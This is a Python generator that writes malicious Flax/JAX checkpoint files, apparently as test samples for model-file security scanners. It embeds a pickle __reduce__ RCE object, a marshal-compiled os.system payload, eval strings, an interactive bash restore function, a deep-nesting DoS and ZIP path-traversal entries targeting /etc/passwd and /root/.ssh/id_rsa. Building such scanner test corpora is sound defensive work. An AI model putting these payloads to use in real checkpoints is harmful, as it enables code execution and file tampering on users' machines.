"""
Flax/JAX Attack Vector Generator

Generates real Flax/JAX checkpoint files (.msgpack, .flax, .orbax):
- Real msgpack-serialised data with embedded attack payloads
- pickle-in-msgpack (nested pickle bytes inside message pack)
- Directory traversal checkpoint structures

Requires: msgpack (pip install msgpack)
"""

import pickle
import zipfile
from pathlib import Path
from typing import Dict, List, Tuple

import msgpack


class FlaxJAXAttackGenerator:
    """Generate Flax/JAX-specific attack vectors (real .msgpack binary files)."""

    def __init__(self, output_dir: str = "./output"):
        self.output_dir = Path(output_dir) / "flax_jax_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.generated_files = []

    def generate_host_callback_exploit(self) -> Tuple[str, int]:
        """Generate msgpack checkpoint with malicious host-callback payload.

        Attack Vector:
            JAX serialises checkpoint data as msgpack. This file embeds a
            dict with a "jax.experimental.host_callback" key whose value
            is a Python expression — scanners must detect callable payloads
            in checkpoint metadata.

        Severity: CRITICAL
        Detection: Callback registration analysis, string content scanning
        """
        filepath = self.output_dir / "01_host_callback_exploit.msgpack"

        data = {
            "callbacks": [
                {
                    "name": "malicious_callback",
                    "function": "__import__('os').system('id')",
                    "args": [],
                    "result_shape": [1],
                }
            ],
            "execution_trigger": "jax.experimental.host_callback.call(malicious_callback, x)",
            "weights": {"layer1": [0.1, 0.2, 0.3]},
        }
        filepath.write_bytes(msgpack.packb(data, use_bin_type=True))

        self.generated_files.append(str(filepath))
        return str(filepath), 1

    def generate_msgpack_exploit(self) -> Tuple[str, int]:
        """Generate msgpack with deeply nested structure (DoS).

        Attack Vector:
            Pathologically nested msgpack dicts — each unpack call recurses
            deeper, eventually causing a stack overflow.

        Severity: HIGH
        Detection: Nesting depth limits
        """
        filepath = self.output_dir / "02_msgpack_exploit.msgpack"

        # Build 500-level deep nesting
        node: dict = {"val": 1}
        for _ in range(500):
            node = {"nested": node}
        filepath.write_bytes(msgpack.packb(node, use_bin_type=True))

        self.generated_files.append(str(filepath))
        return str(filepath), 5000

    def generate_orbax_restore_exploitation(self) -> Tuple[str, int]:
        """Generate msgpack checkpoint with malicious restore-function metadata.

        Attack Vector:
            Orbax checkpoints include metadata about restoration. This file
            embeds Python code strings in the restore_fn field — exploits
            eval()-based restore implementations.

        Severity: CRITICAL
        Detection: Restore function validation
        """
        filepath = self.output_dir / "03_orbax_restore_exploit.msgpack"

        data = {
            "checkpoint_type": "orbax",
            "restore_functions": [
                {
                    "name": "custom_restore",
                    "function": "import subprocess; subprocess.call(['bash', '-i'])",
                    "triggered_at": "checkpoint_load",
                }
            ],
            "state": {"params": {"kernel": [1.0, 0.0, 0.0, 1.0]}},
        }
        filepath.write_bytes(msgpack.packb(data, use_bin_type=True))

        self.generated_files.append(str(filepath))
        return str(filepath), 1

    def generate_pickle_in_jax(self) -> Tuple[str, int]:
        """Generate msgpack with embedded pickle RCE bytes.

        Attack Vector:
            Some JAX checkpoint readers pickle-load arbitrary fields.
            Embedding pickle bytes inside a msgpack "weights" field
            triggers RCE when the reader calls pickle.loads() on it.

        Severity: CRITICAL
        Detection: Pickle detection inside msgpack, opcode analysis
        """
        filepath = self.output_dir / "04_pickle_in_jax.msgpack"

        class RCEPayload:
            def __reduce__(self):
                import os
                return (os.system, ("whoami",))

        pkl_bytes = pickle.dumps(RCEPayload(), protocol=2)

        data = {
            "serialization_format": "pickle",
            "weights": pkl_bytes,         # Raw pickle bytes as a msgpack bin field
            "config": "__import__('os').system('whoami')",
        }
        filepath.write_bytes(msgpack.packb(data, use_bin_type=True))

        self.generated_files.append(str(filepath))
        return str(filepath), 2

    def generate_bytecode_injection(self) -> Tuple[str, int]:
        """Generate msgpack with serialised Python code object.

        Attack Vector:
            A marshal-serialised code object embedded inside msgpack.
            Readers that call exec()/eval() on checkpoint code fields
            execute the payload.

        Severity: CRITICAL
        Detection: Bytecode inspection, code object analysis
        """
        import marshal
        filepath = self.output_dir / "05_bytecode_injection.msgpack"

        # Compile a code object that calls os.system
        code_obj = compile('import os; os.system("id")', "<payload>", "exec")
        code_bytes = marshal.dumps(code_obj)

        data = {
            "code_objects": [
                {
                    "name": "malicious_fn",
                    "bytecode": code_bytes,      # raw marshal bytes
                    "function": "__import__('os').system('id')",
                }
            ]
        }
        filepath.write_bytes(msgpack.packb(data, use_bin_type=True))

        self.generated_files.append(str(filepath))
        return str(filepath), 1

    def generate_checkpoint_directory_traversal(self) -> Tuple[str, int]:
        """Generate ZIP-based checkpoint with path-traversal filenames.

        Attack Vector:
            Orbax-style checkpoints are directories or ZIP archives.
            Member filenames use "../../etc/passwd" to escape the target dir.

        Severity: HIGH
        Detection: Path validation, sandbox checks
        """
        filepath = self.output_dir / "06_checkpoint_traversal.zip"

        traversal_paths = [
            "../../../../../../etc/passwd",
            "../../../root/.ssh/id_rsa",
        ]
        with zipfile.ZipFile(filepath, "w", zipfile.ZIP_STORED) as zf:
            for path in traversal_paths:
                # Checkpoint entry data is a small msgpack blob
                zf.writestr(
                    path,
                    msgpack.packb({"weights": [1.0, 2.0]}, use_bin_type=True),
                )

        self.generated_files.append(str(filepath))
        return str(filepath), 2

    def generate_all(self) -> Dict[str, Tuple[str, int]]:
        return {
            "host_callback": self.generate_host_callback_exploit(),
            "msgpack_exploit": self.generate_msgpack_exploit(),
            "orbax_restore": self.generate_orbax_restore_exploitation(),
            "pickle_in_jax": self.generate_pickle_in_jax(),
            "bytecode_injection": self.generate_bytecode_injection(),
            "checkpoint_traversal": self.generate_checkpoint_directory_traversal(),
        }

    def get_generated_files(self) -> List[str]:
        return self.generated_files


if __name__ == "__main__":
    generator = FlaxJAXAttackGenerator(output_dir="./output")
    results = generator.generate_all()
    for name, (path, metric) in results.items():
        print(f"{name}: {path} ({metric})")
